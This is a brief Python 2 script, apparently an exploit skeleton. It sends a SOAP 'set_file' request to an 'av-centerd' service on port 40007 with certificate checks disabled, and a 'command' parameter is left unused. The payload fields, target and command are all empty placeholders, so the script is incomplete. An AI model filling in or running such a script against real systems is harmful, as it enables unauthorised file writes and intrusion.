#! /usr/bin/python

import string
import random
import urllib
import httplib2

target = ""
command = ""

def soapRequest(target, command):
	soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
	soap += "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n"
	soap += "xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n"
	soap += "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n"
	soap += "soap:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n"
	soap += "<soap:Body>\r\n"
	soap += ""	# $function_llamada
	soap += ""	# $nombre
	soap += ""	# $uuid
	soap += ""	# $admin_ip
	soap += ""	# $hostname
	soap += ""	# $r_file
	soap += ""	# $md5sum
	soap += ""	# $file_content
	soap += ""	# $file_owner
	soap += ""	# $file_group
	soap += ""	# $file_permission
	soap += ""	# close things out
	soap += "</soap:Body>\r\n"
	soap += "</soap:Envelope>\r\n"

	return soap

def main(target, command):
	url = "https://%s:40007/av-centerd"	% target
	headers = {
		"Content-Type": 'text/xml; charset=UTF-8',
		"SOAPAction": '"AV/CC/Util#set_file"'
	}
	h = httplib2.Http(disable_ssl_certificate_validation=True)
	res, content = h.request(url, method="POST", headers=headers, body=soapRequest(target, command))

	print content

if __name__ == "__main__":
	main(target, command)
